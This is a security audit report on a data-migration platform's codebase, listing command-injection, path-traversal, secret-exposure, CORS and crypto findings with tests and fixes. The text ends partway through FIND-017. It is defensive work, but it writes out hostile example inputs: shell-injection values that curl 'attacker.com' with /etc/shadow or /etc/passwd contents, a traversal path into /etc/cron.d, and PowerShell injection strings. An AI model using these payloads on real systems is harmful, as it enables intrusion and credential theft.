# 🔐 NDM Security Data-Flow Audit — Findings Report

**Repository:** `NetApp-Cloud-DataMigrate/ndm`
**Audit Date:** 2026-05-15
**Total Findings:** 23 — **3 CRITICAL · 9 HIGH · 7 MEDIUM · 4 LOW**

---

## 1. Attacker-Controlled Ingress Point Map

```mermaid
flowchart TD
    A[Browser / HTTP Client] -->|REST API JSON body| B[NestJS Controllers<br/>admin / jobs / config / reports / support / db-writer]

    B -->|hostname, exportPath from MountRequest| C[mount-tracker.service.ts<br/>runCommand execAsync template]
    C -->|/bin/sh -c unquoted env expansion| SH[OS Shell ⚠ RCE]

    B -->|smartConnectSsip, dnsZone from Isilon config| D[isilon-storage-client.ts<br/>powershell / nslookup / netsh execAsync]
    D -->|string interpolation| SH

    B -->|dnsZone config field| E[isilon-storage-client.ts<br/>path.join resolverDir + dnsZone]
    E -->|arbitrary file write| FS[/etc/... filesystem ⚠ RCE via cron]

    B -->|upgrade archive fileName| F[upgrade.service.ts<br/>extracts tar via spawn]
    F -->|archive entry paths| FS

    B -->|filter query param JSON| G[TypeORM .findAll where clause<br/>JSON.parse unvalidated]
    G -->|operator injection / prototype pollution| DB[Database ⚠ Data exfil]

    H[Worker JWT] -->|GET /auth/secrets/redis| I[admin-service auth.controller<br/>returns plaintext Redis password]
    I -->|credential leak| Redis[Redis instance ⚠ Full data access]

    J[KEYCLOAK_ADMIN_PASSWORD env var<br/>default: 'admin'] -->|hardcoded fallback| KC[Keycloak Admin API ⚠ IdP takeover]

    K[VITE_KEYCLOAK_CLIENT_SECRET env var] -->|generate_env.sh| L[/assets/env-config.js<br/>nginx static file PUBLIC]
    L -->|window.env in browser| AES[AES-256-CTR key derivation ⚠ All encryption defeated]

    M[SMB share file paths<br/>attacker-controlled filenames] -->|getSID utils.ts| N[execSync powershell.exe<br/>no quote escaping ⚠ RCE]
    M -->|resetFileAttributes| O[attrib -H -R double-quoted path<br/>⚠ RCE]

    P[dirPath from date range in<br/>Temporal workflow payload] -->|findFilesInDirectory| Q[exec find dirPath<br/>double-quoted interpolation ⚠ RCE]

    R[scriptPath + version from config] -->|linux-binary.handler| S[systemd-run bash -c template<br/>⚠ RCE if config compromised]

    T[Vault .env files /vault/secrets/*.env] -->|entrypoint.sh source| SH

    U[x-worker-ip HTTP header] -->|work-manager.controller| LOG[Audit logs / IP-based routing<br/>⚠ spoofable identity]

    V[ASUP archive payload] -->|reports-service| W[MD5 checksum<br/>⚠ collision-forgeable]

    X[TLS certificate from file server<br/>first connection] -->|fetchCertificate rejectUnauthorized=false| TLS[Stored trusted cert<br/>⚠ MITM on initial fetch]
```

---

## 2. Summary Table

| ID | Severity | Service | File | Lines | Title |
|---|---|---|---|---|---|
| [FIND-001](#find-001) | 🔴 CRITICAL | jobs-service | `mount-tracker.service.ts` | 477 | Command Injection via Mount Template Shell Expansion |
| [FIND-002](#find-002) | 🔴 CRITICAL | config-service | `isilon-storage-client.ts` | 818, 843, 863 | Command Injection — PowerShell/nslookup/netsh Interpolation |
| [FIND-003](#find-003) | 🔴 CRITICAL | datamigrator-ui | `generate_env.sh:31`, `common.utils.ts:152` | 31, 152 | Keycloak Client Secret Exposed in Public Static JS File |
| [FIND-004](#find-004) | 🟠 HIGH | worker | `utils.ts` | 439–441 | Command Injection — getSID PowerShell (no quote escaping) |
| [FIND-005](#find-005) | 🟠 HIGH | worker | `win-operation.service.ts` | 267–270 | Command Injection — resetFileAttributes double-quote injection |
| [FIND-006](#find-006) | 🟠 HIGH | worker | `linux-binary.handler.ts` | 82–83 | Command Injection — upgrade handler systemd-run bash -c |
| [FIND-007](#find-007) | 🟠 HIGH | ALL services | `*/main.ts` | 44, 47, 45, 63, 33 | Wildcard CORS (no origin restriction) |
| [FIND-008](#find-008) | 🟠 HIGH | admin-service | `auth.controller.ts` | 113–126 | Redis Credentials Returned in Plaintext via API |
| [FIND-009](#find-009) | 🟠 HIGH | admin-service | `keycloak.config.ts` | 16–18 | Hardcoded Default Keycloak Admin Password ('admin') |
| [FIND-010](#find-010) | 🟠 HIGH | config-service | `isilon-storage-client.ts` | 786–801 | Path Traversal → Arbitrary File Write under /etc/ |
| [FIND-011](#find-011) | 🟠 HIGH | support-service | `log-generator.activity.ts` | 272–277 | Command Injection — find command with unquoted dirPath |
| [FIND-012](#find-012) | 🟠 HIGH | admin-service | `user/project/account.controller.ts` | 101, 100, 117 | Unvalidated JSON.parse Used as TypeORM Where Clause |
| [FIND-013](#find-013) | 🟡 MEDIUM | reports-service | `asup-packager.service.ts` | 129–130 | MD5 Used for ASUP Payload Integrity Check |
| [FIND-014](#find-014) | 🟡 MEDIUM | config-service | `storage-client.ts` | 95–101 | TLS Certificate Validation Disabled for Initial Cert Fetch |
| [FIND-015](#find-015) | 🟡 MEDIUM | admin-service + datamigrator-ui | `crypto-utils.ts:23`, `common.utils.ts:154` | 23, 154 | Weak KDF (raw SHA-256) + Unauthenticated AES-256-CTR |
| [FIND-016](#find-016) | 🟡 MEDIUM | worker | `utils.ts` | 441 | execSync Blocks Event Loop During File Migration |
| [FIND-017](#find-017) | 🟡 MEDIUM | config-service | `work-manager.controller.ts` | 52, 80 | Spoofable x-worker-ip Header Trusted for Identity |
| [FIND-018](#find-018) | 🟡 MEDIUM | admin-service | `user.controller.ts` | 101 | Unguarded JSON.parse → DoS + Prototype Pollution |
| [FIND-019](#find-019) | 🟡 MEDIUM | datamigrator-ui | `generate_env.sh` | 5–35 | Env Vars Written to JS Without Escaping — XSS Vector |
| [FIND-020](#find-020) | 🟡 MEDIUM | jobs/db-writer/worker | `auth.service.ts:86/89/53` | 86, 89, 53 | Full Stack Traces Logged in Auth Error Path |
| [FIND-021](#find-021) | 🔵 LOW | ALL services | `entrypoint.sh` | 9–12 | Vault .env Files Sourced as Shell Code |
| [FIND-022](#find-022) | 🔵 LOW | jobs-service | `jobrun.service.ts` | 873–930 | SQL Column Map Maintenance Trap |
| [FIND-023](#find-023) | 🔵 LOW | datamigrator-ui | `common.utils.ts` | 148–175 | UI Encryption Rendered Useless by FIND-003 |

---

## 3. Detailed Findings

---

### FIND-001
**🔴 CRITICAL — Command Injection via Mount Template Shell Expansion**

| Field | Detail |
|---|---|
| **Ingress** | `hostname`, `exportPath`, `protocolVersion` from HTTP API body → stored config → `MountRequest` |
| **File** | `services/jobs-service/src/jobconfig/mount-tracker.service.ts` |
| **Lines** | ~477 (execAsync call in `runCommand`); template defined elsewhere in the same file |
| **Suspicious Code** | `await execAsync(template, { env, timeout: ... })` where `template = "mount -t nfs ${HOST}:${MOUNT_PATH} ${DIR_PATH}"` and `HOST = request.hostname.replace(/\0/g, '').trim()` |

**Why It's Dangerous:**
`execAsync` (a promisified `exec`) runs via `/bin/sh -c`. Although user-controlled values are passed as shell environment variables, the template string is still expanded by the shell without quoting. A `hostname` value like `server; curl http://attacker.com/$(cat /etc/shadow) #` results in two shell commands being executed. The only sanitization is null-byte stripping and trimming — shell metacharacters (`;`, `|`, `$()`, backticks) are **not** removed.

**Severity / Priority:** CRITICAL — direct OS command execution with the `jobs-service` process's privileges from stored user input.

**Exploitability / Preconditions:** Requires an authenticated user with file-server configuration permission. Once a malicious hostname is stored, every subsequent mount operation triggers the injected command.

**Safe Validation Approach (non-weaponized):**
- Unit test: Pass `hostname = "127.0.0.1; true"` through `runCommand` in a sandboxed test environment and assert that exactly one process was spawned (not two).
- Integration test: Verify the file-server hostname field rejects input matching `/[;&|`$(){}[\]\\]` at the API layer and returns HTTP 400.

**Recommended Fix:**
Replace `execAsync(template)` with `execFileAsync` and an explicit argument array:
```typescript
// Instead of: await execAsync(`mount -t nfs ${HOST}:${MOUNT_PATH} ${DIR_PATH}`, ...)
await execFileAsync('mount', ['-t', 'nfs', `${host}:${exportPath}`, mountDir], { timeout: ... });
```
Enforce an allowlist regex on `hostname` before storage: `/^[a-zA-Z0-9._-]+$/`.

---

### FIND-002
**🔴 CRITICAL — Command Injection — PowerShell/nslookup/netsh String Interpolation**

| Field | Detail |
|---|---|
| **Ingress** | `smartConnectSsip`, `smartConnectDnsZone` from Isilon file server configuration (stored in DB / HTTP API) |
| **File** | `services/config-service/src/storage-clients/isilon/isilon-storage-client.ts` |
| **Lines** | 818 (`powershell Add-DnsClientNrptRule`), 843 (`nslookup`), 863 (`netsh interface ip add dns`) |
| **Suspicious Code** | `await execAsync(\`nslookup ${dnsZone} ${ssip}\`)` and similar patterns |

**Why It's Dangerous:**
All four `execAsync` calls build shell command strings by directly interpolating `dnsZone` and `ssip` — both values that an authenticated admin stores via the API. A value like `zone' && curl http://attacker.com/$(cat /etc/passwd) #` in `dnsZone` will exfiltrate sensitive files on the config-service pod.

**Severity / Priority:** CRITICAL — authenticated admin-level configuration leads to RCE on the config-service container.

**Exploitability / Preconditions:** Requires creating or modifying an Isilon file server record with a malicious `smartConnectDnsZone`. Triggered when a worker connects and DNS configuration is applied.

**Safe Validation Approach:**
- Unit test: Assert that `configureWindowsDns` with a `dnsZone` of `"test' | echo injected"` throws a validation error before reaching `execAsync`.
- Integration test: Confirm the API endpoint rejects dnsZone values that do not match `/^[a-zA-Z0-9._-]+$/`.

**Recommended Fix:**
```typescript
// Strict validation before any exec call:
if (!/^[a-zA-Z0-9._-]+$/.test(dnsZone)) throw new BadRequestException('Invalid dnsZone');
if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(ssip)) throw new BadRequestException('Invalid ssip');

// Replace exec string with execFileAsync arg arrays:
await execFileAsync('nslookup', [dnsZone, ssip]);
await execFileAsync('powershell', ['-Command', `Add-DnsClientNrptRule -Namespace '.${dnsZone}' -NameServers '${ssip}'`]);
```

---

### FIND-003
**🔴 CRITICAL — Keycloak Client Secret Exposed in Public Static JS File**

| Field | Detail |
|---|---|
| **Ingress** | `VITE_KEYCLOAK_CLIENT_SECRET` environment variable → `generate_env.sh` → `/assets/env-config.js` served by nginx |
| **Files** | `services/datamigrator-ui/generate_env.sh:31`, `services/datamigrator-ui/src/utils/common.utils.ts:152–153` |
| **Lines** | `generate_env.sh:31`; `common.utils.ts:152` |
| **Suspicious Code** | `echo "  VITE_KEYCLOAK_CLIENT_SECRET: \"${VITE_KEYCLOAK_CLIENT_SECRET}\"," >> $CONFIG_FILE` and `const key = crypto.createHash('sha256').update(window?.env?.VITE_KEYCLOAK_CLIENT_SECRET).digest()` |

**Why It's Dangerous:**
The Keycloak OAuth client secret is written into `/assets/env-config.js`, a publicly accessible static file served by nginx with **no authentication**. This secret is then used as the AES-256-CTR encryption key for client-side password encryption. An unauthenticated attacker can:
1. `curl https://<app>/assets/env-config.js | grep KEYCLOAK_CLIENT_SECRET` to obtain the secret.
2. Use the secret to request tokens from Keycloak via `client_credentials` flow — impersonating the entire application.
3. Decrypt any AES-CTR ciphertext produced by the UI.

Note: Vite's `VITE_` prefix convention signals that variables are **public by design** — this is correct behavior for Vite, making the secret exposure architectural, not accidental.

**Severity / Priority:** CRITICAL — zero-precondition exposure of an OAuth secret.

**Exploitability / Preconditions:** None required. Any network-accessible deployment exposes this secret to unauthenticated users.

**Safe Validation Approach:**
- Automated test: `curl` the `/assets/env-config.js` endpoint without authentication and check the response for `KEYCLOAK_CLIENT_SECRET`.
- Integration test: Verify that the Keycloak token endpoint rejects `client_credentials` requests with the client secret (i.e., the client should be switched to PKCE public client flow).

**Recommended Fix:**
1. Switch the frontend Keycloak client to **PKCE Authorization Code flow** — no client secret is needed in the browser.
2. Remove `VITE_KEYCLOAK_CLIENT_SECRET` from `generate_env.sh` entirely.
3. Remove all client-side AES encryption that relies on this key; move encryption server-side.
4. Immediately rotate the Keycloak client secret.

---

### FIND-004
**🟠 HIGH — Command Injection — getSID PowerShell (no quote escaping)**

| Field | Detail |
|---|---|
| **Ingress** | `filePath` derived from filesystem traversal of remote SMB share (attacker-controlled file names) |
| **File** | `services/worker/src/activities/utils/utils.ts` |
| **Lines** | 439–441 |
| **Suspicious Code** | `const getSIDCommand = \`powershell.exe -Command "(Get-Acl '${filePath}').Owner"\`; return execSync(getSIDCommand, ...)` |

**Why It's Dangerous:**
The `filePath` variable is interpolated into a PowerShell command using single-quote delimiters **without escaping single quotes**. Notably, `win-operation.service.ts` line 82 (in the same worker service) **does** correctly escape with `.replace(/'/g, "''")` — but `getSID` does not. A file named `test' ; Write-Output pwned ; '` on a migrated share will break the single-quote context and execute arbitrary PowerShell. This also uses the blocking `execSync`.

**Severity / Priority:** HIGH — exploitable by an attacker who controls file names on a migrated SMB share.

**Exploitability / Preconditions:** Requires either: (a) a malicious source SMB share, or (b) a malicious file name on a legitimate share. Triggered during ACL collection phase of any migration touching the affected file.

**Safe Validation Approach:**
- Unit test: Call `getSID("test' ; Write-Output injected ; '")` in a sandboxed Windows test environment and assert no injection occurs (PowerShell should throw a syntax error, not execute the injected command).
- Integration test: Create a file with a single-quote in the name on a test share and verify migration completes without shell side-effects.

**Recommended Fix:**
```typescript
export const getSID = async (filePath: string): Promise<string> => {
  const escaped = filePath.replace(/'/g, "''");
  const { stdout } = await execFileAsync('powershell.exe', ['-Command', `(Get-Acl '${escaped}').Owner`]);
  return stdout.trim();
};
```
Longer term: use a Windows API binding (e.g., `koffi`) to call `GetNamedSecurityInfoW` directly — eliminating the shell entirely.

---

### FIND-005
**🟠 HIGH — Command Injection — resetFileAttributes double-quote injection**

| Field | Detail |
|---|---|
| **Ingress** | `path` from file migration activities on remote file shares |
| **File** | `services/worker/src/activities/core/migrate/command-execution/win-opeartions/win-operation.service.ts` |
| **Lines** | 267–270 |
| **Suspicious Code** | `await this.winShellService.executeCommand(\`attrib -H -R "${path}"\`)` |

**Why It's Dangerous:**
`path` is embedded inside double-quotes in the `attrib` command string. `WinShellService` wraps the command in `powershell.exe`. A file named `test"test` (containing a double-quote) breaks quoting; a carefully crafted name like `x"; Start-Process calc.exe; "y` executes arbitrary PowerShell.

**Severity / Priority:** HIGH — attacker-controlled file names on a migrated share trigger RCE during attribute reset.

**Exploitability / Preconditions:** Requires a migrated share containing a file with a double-quote in its name. NTFS supports double-quotes in file names.

**Safe Validation Approach:**
- Unit test: Pass `path = 'test"test'` to `resetFileAttributes()` and verify the command fails with a syntax error rather than executing the injected segment.

**Recommended Fix:**
```typescript
const escaped = path.replace(/"/g, '\\"');
await this.winShellService.executeCommand(`attrib -H -R "${escaped}"`);
// Or use PowerShell variable to fully avoid shell-quoting issues:
// $p = 'escaped_single_quoted_path'; attrib -H -R $p
```

---

### FIND-006
**🟠 HIGH — Command Injection — upgrade handler systemd-run bash -c**

| Field | Detail |
|---|---|
| **Ingress** | `scriptPath` and `logFile` from `configService`/`stagingBase` config; `version` from upgrade bundle filename |
| **File** | `services/worker/src/activities/upgrade/handlers/linux-binary.handler.ts` |
| **Lines** | 82–83 |
| **Suspicious Code** | `` const cmd = `systemd-run ... bash -c '${scriptPath} ${version} >> ${logFile} 2>&1'`; exec(cmd, ...)`` |

**Why It's Dangerous:**
The command is passed as a single shell string to `exec()`. The `bash -c '...'` pattern breaks if any variable contains a single quote. If `stagingBase` (and thus `scriptPath` or `logFile`) can be influenced by an attacker (compromised worker config, env injection), arbitrary shell commands execute with worker privileges during the upgrade workflow.

**Severity / Priority:** HIGH — upgrade flow is a privileged, infrequently audited path.

**Exploitability / Preconditions:** Requires compromising worker configuration or environment variable delivery (e.g., a malicious Vault secret, a misconfigured ConfigMap).

**Safe Validation Approach:**
- Unit test: Set `scriptPath` to a value containing a single quote and verify the upgrade handler throws a validation error or sanitizes before exec.
- Static analysis: Verify `scriptPath` and `logFile` are path-resolved and constrained within `stagingBase`.

**Recommended Fix:**
```typescript
import { execFile } from 'child_process';
execFile('systemd-run', [
  '--unit=ndm-worker-upgrade',
  '--remain-after-exit',
  'bash', '-c', `${scriptPath} ${version} >> ${logFile} 2>&1`
], callback);
// Also: validate scriptPath with path.resolve() and assert it starts with allowed stagingBase directory.
```

---

### FIND-007
**🟠 HIGH — Wildcard CORS Across All Backend Services**

| Field | Detail |
|---|---|
| **Ingress** | HTTP `Origin` header from any browser |
| **Files** | `services/admin-service/src/main.ts:44`, `services/jobs-service/src/main.ts:47`, `services/config-service/src/main.ts:45`, `services/reports-service/src/main.ts:63`, `services/db-writer/src/main.ts:33` |
| **Lines** | 44, 47, 45, 63, 33 (respectively) |
| **Suspicious Code** | `app.enableCors();` (no options = `Access-Control-Allow-Origin: *`) |

**Why It's Dangerous:**
NestJS `enableCors()` with no arguments sets `Access-Control-Allow-Origin: *` on **all 5 backend services**. Any website can make cross-origin requests to these APIs. If cookies or `Authorization` headers are used with `credentials: 'include'`, browsers will reject responses — but if auth is done via `localStorage` tokens (common in Keycloak-fronted SPAs), a malicious page can silently make authenticated requests on the victim's behalf.

**Severity / Priority:** HIGH — combined with XSS (FIND-019), this is a straightforward exfiltration vector.

**Exploitability / Preconditions:** Requires a user with an active session to visit a malicious page.

**Safe Validation Approach:**
- Test: From a different origin in a test browser, issue a fetch to `/api/v1/admin/users` and verify the `Access-Control-Allow-Origin` header does NOT include `*` for authenticated endpoints.

**Recommended Fix:**
```typescript
app.enableCors({
  origin: process.env.ALLOWED_ORIGINS?.split(',') ?? [],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
});
```

---

### FIND-008
**🟠 HIGH — Redis Credentials Returned in Plaintext via API**

| Field | Detail |
|---|---|
| **Ingress** | Worker JWT token (`@AuthWorker()` guard) |
| **File** | `services/admin-service/src/auth/auth.controller.ts` |
| **Lines** | 113–126 |
| **Suspicious Code** | `@Get('secrets/redis') @AuthWorker() async getRedisCredentials() { return { host, port, username, password: process.env.REDIS_PASSWORD } }` |

**Why It's Dangerous:**
This endpoint returns the Redis host, port, username, and **plaintext password** to any client presenting a valid worker JWT. A compromised worker host immediately yields:
- Read/write access to all Redis data (migration states, job contexts, possibly auth tokens)
- Ability to insert malicious job data
- Potential Redis RCE via `MODULE LOAD` if Redis is not configured with ACLs

**Severity / Priority:** HIGH — single JWT compromise escalates to full Redis data-plane access.

**Exploitability / Preconditions:** Requires a valid, long-lived worker JWT. Worker JWTs are service tokens, not short-lived user tokens.

**Safe Validation Approach:**
- Test: With a valid worker JWT, `GET /v1/admin/auth/secrets/redis` — verify the password field is absent or masked in the response.

**Recommended Fix:**
1. Do not return Redis credentials via API — inject them into workers via Kubernetes Secrets or HashiCorp Vault directly.
2. If API delivery is required, use short-lived mTLS certificates or Vault dynamic secrets with TTLs.
3. Immediately rotate the Redis password.

---

### FIND-009
**🟠 HIGH — Hardcoded Default Keycloak Admin Credentials**

| Field | Detail |
|---|---|
| **Ingress** | `KEYCLOAK_ADMIN_PASSWORD` environment variable (absent in misconfigured deployments) |
| **File** | `services/admin-service/src/config/keycloak.config.ts` |
| **Lines** | 16–18 |
| **Suspicious Code** | `keycloakAdminPassword: process.env.KEYCLOAK_ADMIN_PASSWORD \|\| 'admin'` |

**Why It's Dangerous:**
If the environment variable is not set (dev deployments, misconfigured secrets management, failed Vault injection), the admin-service authenticates to Keycloak with `admin`/`admin`. This grants full IdP control: create admin users, change passwords, exfiltrate all user credentials, and revoke all sessions.

**Severity / Priority:** HIGH — one misconfigured deployment = full identity provider takeover.

**Exploitability / Preconditions:** Misconfigured deployment or intentional dev/staging shortcut. Default Keycloak also ships with `admin`/`admin`, making this doubly dangerous.

**Safe Validation Approach:**
- CI/CD test: Deploy without `KEYCLOAK_ADMIN_PASSWORD` set. Assert that `admin-service` **fails to start** (startup validation error), rather than silently using `'admin'`.

**Recommended Fix:**
```typescript
// Throw at startup if credential env vars are absent:
const keycloakAdminPassword = process.env.KEYCLOAK_ADMIN_PASSWORD;
if (!keycloakAdminPassword) {
  throw new Error('KEYCLOAK_ADMIN_PASSWORD is required and must be explicitly configured');
}
```
Remove all `|| 'admin'` fallbacks from credential configuration.

---

### FIND-010
**🟠 HIGH — Path Traversal → Arbitrary File Write Under /etc/**

| Field | Detail |
|---|---|
| **Ingress** | `smartConnectDnsZone` from Isilon file server configuration |
| **File** | `services/config-service/src/storage-clients/isilon/isilon-storage-client.ts` |
| **Lines** | 786–801 |
| **Suspicious Code** | `const resolverFile = path.join(resolverDir, dnsZone); ... await fsPromises.writeFile(resolverFile, resolverContent)` |

**Why It's Dangerous:**
`path.join('/etc/resolver', dnsZone)` does **not** prevent directory traversal. `dnsZone = "../../cron.d/malicious"` resolves to `/etc/cron.d/malicious`. Writing attacker-controlled content to `/etc/cron.d/` achieves code execution via cron. Similarly, `/etc/ld.so.preload`, `/etc/profile.d/`, or `/etc/sudoers.d/` are viable targets.

**Severity / Priority:** HIGH — authenticated admin config input → arbitrary write to `/etc/` → container RCE.

**Exploitability / Preconditions:** Admin access to create/edit an Isilon file server record. Impact: arbitrary file write leading to code execution.

**Safe Validation Approach:**
- Unit test: Pass `dnsZone = "../../tmp/traversal_test"` to the DNS configuration function and assert a validation error is thrown **before** any `writeFile` call occurs.
- Integration test: Verify the API rejects `smartConnectDnsZone` values that don't match `/^[a-zA-Z0-9._-]+$/`.

**Recommended Fix:**
```typescript
// Strict validation:
if (!/^[a-zA-Z0-9._-]+$/.test(dnsZone)) {
  throw new BadRequestException('Invalid dnsZone format');
}

// Defense-in-depth path check after join:
const resolverFile = path.join(resolverDir, dnsZone);
if (!path.resolve(resolverFile).startsWith(path.resolve(resolverDir) + path.sep)) {
  throw new Error('Path traversal detected in dnsZone');
}
```

---

### FIND-011
**🟠 HIGH — Command Injection — find Command with Unquoted dirPath**

| Field | Detail |
|---|---|
| **Ingress** | `dirPath` from `path.join(baseLogPath, date)` where `date` originates from a user-supplied date range in the Temporal workflow payload |
| **File** | `services/support-service/src/activities/log-generator/log-generator.activity.ts` |
| **Lines** | 272–277 |
| **Suspicious Code** | `const findCommand = \`find "${dirPath}" -type f\`; const { stdout } = await exec(findCommand)` |

**Why It's Dangerous:**
`dirPath` is interpolated into a shell string with double-quote delimiters. A crafted date like `2024-01-01"; id > /workspace/injected; echo "` injects shell commands. `exec()` runs via `/bin/sh -c`, so the injected commands execute with support-service privileges.

**Severity / Priority:** HIGH — user-controllable date range in a support bundle request translates to RCE.

**Exploitability / Preconditions:** Requires ability to trigger the support bundle generation workflow with an attacker-controlled `startDate` or `endDate` parameter.

**Safe Validation Approach:**
- Unit test: Pass `dirPath = '/var/log/ndm/2024-01-01"; true #'` to `findFilesInDirectory()` and assert a validation error is thrown without invoking `exec`.
- Integration test: Submit a support bundle request with `startDate = "invalid"` and verify the service returns 400.

**Recommended Fix:**
```typescript
// Use execFileAsync with explicit argument array:
const { stdout } = await execFileAsync('find', [dirPath, '-type', 'f']);

// Validate dirPath stays within allowed base:
const resolvedBase = path.resolve(this.baseLogPath);
const resolvedDir = path.resolve(dirPath);
if (!resolvedDir.startsWith(resolvedBase + path.sep)) {
  throw new Error('dirPath escapes baseLogPath');
}
```

---

### FIND-012
**🟠 HIGH — Unvalidated JSON.parse Used as TypeORM Where Clause**

| Field | Detail |
|---|---|
| **Ingress** | `filter` query string parameter (URL-encoded JSON) on admin listing endpoints |
| **Files** | `services/admin-service/src/project/project.controller.ts:100`, `src/user/user.controller.ts:101`, `src/account/account.controller.ts:117`, `src/role-permission/role-permission.controller.ts:100` |
| **Lines** | 100, 101, 117, 100 |
| **Suspicious Code** | `JSON.parse(filter)` passed directly to TypeORM `findAll({ where: filter })` |

**Why It's Dangerous:**
1. **No schema validation** — any JSON object is accepted as a TypeORM `where` filter, enabling TypeORM operator injection (e.g., `{"name": {"$like": "%"}}` can retrieve all records).
2. **Prototype pollution** — `{"__proto__": {"isAdmin": true}}` may pollute `Object.prototype` when the parsed object is spread or merged downstream.
3. **DoS** — `user.controller.ts` calls `JSON.parse(filter)` without a null guard; `?filter=invalid-json` throws an unhandled `SyntaxError` → HTTP 500.

**Severity / Priority:** HIGH — authenticated users can abuse operator injection to extract unauthorized data; unauthenticated clients can DoS.

**Exploitability / Preconditions:** DoS is unauthenticated. Operator injection requires a valid user session.

**Safe Validation Approach:**
- Test: `GET /api/v1/admin/users?filter=not-valid-json` should return HTTP 400, not 500.
- Test: `GET /api/v1/admin/users?filter={"__proto__":{"admin":true}}` should return HTTP 400 with a validation error.

**Recommended Fix:**
```typescript
// Replace raw JSON.parse with a validated DTO:
@Get()
async findAll(@Query(new ValidationPipe({ transform: true })) query: UserFilterDto) {
  // UserFilterDto explicitly whitelists allowed filter fields using class-validator
}
```
Define strict `UserFilterDto` with `@IsOptional()`, `@IsString()`, etc. per field. Never pass raw parsed objects to TypeORM.

---

### FIND-013
**🟡 MEDIUM — MD5 Used for ASUP Payload Integrity Check**

| Field | Detail |
|---|---|
| **Ingress** | ASUP support bundle archive file |
| **File** | `services/reports-service/src/asup/asup-packager.service.ts` |
| **Lines** | 129–130 |
| **Suspicious Code** | `const md5Checksum = crypto.createHash('md5').update(archiveBuffer).digest('hex'); headersMap['X-Netapp-Asup-Payload-Checksum'] = md5Checksum` |

**Why It's Dangerous:**
MD5 is cryptographically broken. Practical collision attacks are well-documented. An attacker with MITM capability on the ASUP transmission path could substitute a malicious payload (e.g., with false diagnostic data or exfiltrated sensitive info disguised as telemetry) with the same MD5 hash, bypassing the integrity check.

**Severity / Priority:** MEDIUM — requires network MITM on ASUP transmission path.

**Safe Validation Approach:**
- Verify that the receiving server actually validates the checksum. If it does, confirm that SHA-256 is accepted.

**Recommended Fix:**
```typescript
const checksum = crypto.createHash('sha256').update(archiveBuffer).digest('hex');
headersMap['X-Netapp-Asup-Payload-Checksum'] = checksum;
```
If the NetApp ASUP receiving server mandates MD5 per protocol spec, document this limitation and add a secondary `X-Netapp-Asup-Payload-Sha256` header for defense-in-depth.

---

### FIND-014
**🟡 MEDIUM — TLS Certificate Validation Disabled for Initial Cert Fetch (TOFU Risk)**

| Field | Detail |
|---|---|
| **Ingress** | `host` parameter from API request (file server connection configuration) |
| **File** | `services/config-service/src/storage-clients/storage-client.ts` |
| **Lines** | 95–101 |
| **Suspicious Code** | `rejectUnauthorized: false` in TLS connection options for initial certificate fetching |

**Why It's Dangerous:**
Certificate validation is intentionally disabled for the initial "Trust on First Use" (TOFU) certificate fetch. An attacker with network MITM capability during this first connection will have their certificate stored as "trusted." All subsequent connections using this stored certificate then bypass real server authentication, permanently trusting the attacker's cert. This is a classic TOFU vulnerability.

**Severity / Priority:** MEDIUM — requires active MITM during a narrow window (first connection), but the consequence is permanent trust establishment.

**Safe Validation Approach:**
- Test: Intercept the initial TLS connection with a self-signed certificate and verify it is accepted and stored.
- Verify: Subsequent connections using the stored cert are accepted even when presented by a different server.

**Recommended Fix:**
1. Display the certificate fingerprint to the user in the UI and require explicit trust confirmation (like SSH host key acceptance).
2. If TOFU is acceptable, implement **change detection**: alert and require re-confirmation if the stored certificate fingerprint changes.
3. Never automatically trust certificates obtained without any validation for access control decisions.

---

### FIND-015
**🟡 MEDIUM — Weak KDF (raw SHA-256) + Unauthenticated AES-256-CTR**

| Field | Detail |
|---|---|
| **Ingress** | `KEYCLOAK_CLIENT_SECRET` (server-side); `VITE_KEYCLOAK_CLIENT_SECRET` (client-side, exposed per FIND-003) |
| **Files** | `services/admin-service/src/utils/crypto-utils.ts:23`, `services/datamigrator-ui/src/utils/common.utils.ts:154` |
| **Lines** | 23 (admin-service), 154 (datamigrator-ui) |
| **Suspicious Code** | `const key = createHash('sha256').update(keyString).digest(); const cipher = createCipheriv('aes-256-ctr', key, iv)` |

**Why It's Dangerous:**
Two compounding cryptographic weaknesses:
1. **Raw SHA-256 as KDF**: No key stretching, no salt. If the input key material is short or predictable, brute-force attacks are feasible.
2. **AES-256-CTR without authentication (no MAC/HMAC)**: Stream cipher modes without authentication allow **bit-flip attacks** — an attacker can flip specific bits in the ciphertext to predictably corrupt the plaintext with **zero error detection**. This is particularly dangerous for encrypted credentials.

Combined with FIND-003, the client-side encryption provides zero protection.

**Severity / Priority:** MEDIUM — the authentication gap enables integrity attacks; combined with FIND-003, confidentiality is already defeated.

**Safe Validation Approach:**
- Unit test: Encrypt a value with `encryptData()`, flip one bit in the ciphertext, and call `decryptData()`. Assert that the function either throws an authentication error or returns a garbled value with no exception (demonstrating lack of authentication).

**Recommended Fix:**
```typescript
// Use AES-256-GCM for authenticated encryption:
const cipher = createCipheriv('aes-256-gcm', key, iv);
// ... (include authTag in output, verify on decryption)

// Use HKDF or PBKDF2 as KDF:
import { hkdfSync } from 'crypto';
const key = hkdfSync('sha256', keyMaterial, salt, 'ndm-v1', 32);
```

---

### FIND-016
**🟡 MEDIUM — execSync Blocks Event Loop During File Migration**

| Field | Detail |
|---|---|
| **Ingress** | `filePath` from file migration activities (called per-file) |
| **File** | `services/worker/src/activities/utils/utils.ts` |
| **Lines** | 441 |
| **Suspicious Code** | `return execSync(getSIDCommand, { encoding: 'utf-8' }).trim()` |

**Why It's Dangerous:**
`execSync()` halts the entire Node.js event loop while PowerShell executes. This is called during migration for every file requiring an ACL/SID lookup. For large migrations (tens of thousands of files), this causes:
- Progressive event loop starvation
- Health check timeouts → Kubernetes pod restarts mid-migration
- Service-level DoS if PowerShell hangs (no effective timeout mechanism)

**Severity / Priority:** MEDIUM — DoS/reliability concern that can interrupt production migrations.

**Safe Validation Approach:**
- Load test: Trigger migration on a directory with 10,000+ files and monitor event loop lag (`--trace-event-categories node.perf`) during the run.

**Recommended Fix:**
```typescript
export const getSID = async (filePath: string): Promise<string> => {
  const escaped = filePath.replace(/'/g, "''");
  const { stdout } = await execFileAsync('powershell.exe', ['-Command', `(Get-Acl '${escaped}').Owner`]);
  return stdout.trim();
};
```

---

### FIND-017
**🟡 MEDIUM — Spoofable x-worker-ip Header Trusted for Identity**

| Field | Detail |
|---|---|
| **Ingress** | `x-worker-ip` HTTP request header, fully attacker-controlled |
| **File** | `services/config-service/src/work-manager/work-manager.controller.ts` |
